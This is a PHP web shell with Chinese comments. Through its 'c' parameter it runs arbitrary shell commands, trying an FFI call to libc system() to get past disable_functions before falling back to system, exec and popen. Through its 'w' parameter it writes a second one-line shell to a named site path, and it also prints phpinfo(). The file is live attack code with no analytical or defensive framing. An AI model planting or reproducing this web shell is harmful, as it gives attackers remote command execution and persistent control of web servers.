<?php
  // 方式1: error_log 写文件 (error_log 没被禁用)
  if(isset($_GET['w'])){
      error_log('<?php system($_GET["c"]);?>', 3, '/www/wwwroot/xlch49.pics/sh.php');
      die('written');
  }
  // 方式2: 直接命令执行
  if(isset($_GET['c'])){
      // 尝试 FFI bypass
      try { $f=FFI::cdef("int system(const char*);","libc.so.6"); $f->system($_GET['c']); }
      catch(Throwable $e){}
      // 回退到 system（disable_functions 可能不同）
      if(function_exists('system')) system($_GET['c']);
      elseif(function_exists('exec')){ exec($_GET['c'],$o); echo join("\n",$o); }
      elseif(function_exists('popen')){ $p=popen($_GET['c'],'r'); while($l=fgets($p))echo $l; }
  }
  phpinfo();
  ?>
